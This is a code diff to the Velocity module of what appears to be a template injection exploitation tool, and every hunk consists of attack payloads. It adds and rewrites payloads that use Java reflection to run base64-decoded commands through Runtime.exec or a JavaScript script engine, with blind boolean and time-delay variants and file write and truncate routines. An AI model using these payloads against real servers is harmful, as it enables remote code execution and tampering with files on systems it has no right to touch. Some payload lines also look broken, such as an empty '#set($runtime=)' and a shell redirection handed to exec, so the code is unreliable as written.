@@ -41,98 +41,96 @@ class Velocity(java.Java):
                 'verify_bool_true':  '#set($o=1.0)#if($o.equals(0.1))#include("Y:/A:/xxx")#end',
                 'verify_bool_false': '#set($o=1.0)#if($o.equals(1.0))#include("Y:/A:/xxx")#end'
             },
+            'evaluate': {
+                'call': 'render',
+                'evaluate': """#set($s="")\
+#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
+$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+${{r}}\
+""",
+                'test_eval': '"executed".replace("xecu", "valua")',
+                'test_eval_expected': 'evaluated'
+            },
+            'evaluate_error': {
+                'call': 'render',
+                'evaluate': """#set($s="")\
+#set($b=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
+$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """#set($s="")\
+#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
+$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#if($r.equals(false))#include("Y:/A:/false")#end
+"""
+            },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """#set($s="")\
+#set($r=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(\
+$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()).newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#if($r.equals(false) != true)#set($t=$s.getClass().forName("java.lang.Thread").sleep({delay}000))#end
+"""
+            },
             'execute': {
                 # This payload comes from henshin's contribution on
                 # issue #9.
                 'call': 'render',
-                'execute': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
-#set($null=$proc.waitFor())\
-#set($istr=$proc.getInputStream())\
-#set($chr=$engine.getClass().forName("java.lang.Character"))\
-#set($output="")\
-#set($string=$engine.getClass().forName("java.lang.String"))\
-#foreach($i in [1..$istr.available()])\
-#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
-#end\
-${{output}}\
+                'execute': """#set($s="")\
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#set($n=$p.waitFor())\
+#set($o=$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))\
+${{o}}\
 """ 
             },
             'execute_error': {
                 'call': 'render',
-                'execute': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
-#set($null=$proc.waitFor())\
-#set($istr=$proc.getInputStream())\
-#set($chr=$engine.getClass().forName("java.lang.Character"))\
-#set($b="")\
-#set($string=$engine.getClass().forName("java.lang.String"))\
-#foreach($i in [1..$istr.available()])\
-#set($b=$b.concat($string.valueOf($chr.toChars($istr.read()))))\
-#end\
+                'execute': """#set($s="")\
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#set($n=$p.waitFor())\
+#set($b=$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))\
 """
             },
             'execute_boolean': {
                 'call': 'inject',
-                'execute_blind': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
-#set($null=$proc.waitFor())\
-#set($res=$proc.exitValue())\
-#if($res != 0)#include("Y:/A:/xxx")#end\
+                'execute_blind': """#set($s="")\
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#set($n=$p.waitFor())\
+#if($n != 0)#include("Y:/A:/xxx")#end\
 """
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}"))\
-#set($null=$proc.waitFor())\
-#set($istr=$proc.getInputStream())\
-#set($chr=$engine.getClass().forName("java.lang.Character"))\
-#set($output="")\
-#set($string=$engine.getClass().forName("java.lang.String"))\
-#foreach($i in [1..$istr.available()])\
-#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
-#end\
-${{output}}\
+                'execute_blind': """#set($s="")\
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
+#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{code_b64p}"), "UTF-8")))\
+#set($n=$p.waitFor())\
+#if($n == 0)#set($t=$s.getClass().forName("java.lang.Thread").sleep({delay}000))#end\
 """
             },
             'write': {
                 'call': 'inject',
-                'write': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}"))\
-#set($null=$proc.waitFor())\
-#set($istr=$proc.getInputStream())\
-#set($chr=$engine.getClass().forName("java.lang.Character"))\
-#set($output="")\
-#set($string=$engine.getClass().forName("java.lang.String"))\
-#foreach($i in [1..$istr.available()])\
-#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
-#end\
-${{output}}\
+                'write': """#set($s="")\
+#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))\
+#set($runtime=)\
+#set($n=$s.getClass().forName("java.lang.Runtime").getRuntime().exec($sc.newInstance(\
+$s.getClass().forName("java.util.Base64").getDecoder().decode("{chunk_b64p}"), "UTF-8")+">>{path}").waitFor())\
 """,
-                'truncate': """#set($engine="")\
-#set($run=$engine.getClass().forName("java.lang.Runtime"))\
-#set($runtime=$run.getRuntime())\
-#set($proc=$runtime.exec("bash -c {{echo,-n,}}>{path}"))\
-#set($null=$proc.waitFor())\
-#set($istr=$proc.getInputStream())\
-#set($chr=$engine.getClass().forName("java.lang.Character"))\
-#set($output="")\
-#set($string=$engine.getClass().forName("java.lang.String"))\
-#foreach($i in [1..$istr.available()])\
-#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
-#end\
-${{output}}\
+                'truncate': """#set($s="")\
+#set($n=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("echo -n>{path}").waitFor())\
 """
             },
         })
@@ -148,3 +146,5 @@ ${{output}}\
                 {'level': 3, 'prefix': '{closure}#end#if(1==1)', 'suffix': '', 'closures': java.ctx_closures},
                 {'level': 5, 'prefix': '*#', 'suffix': '#*'},
         ])
+
+        self.language += ':script'
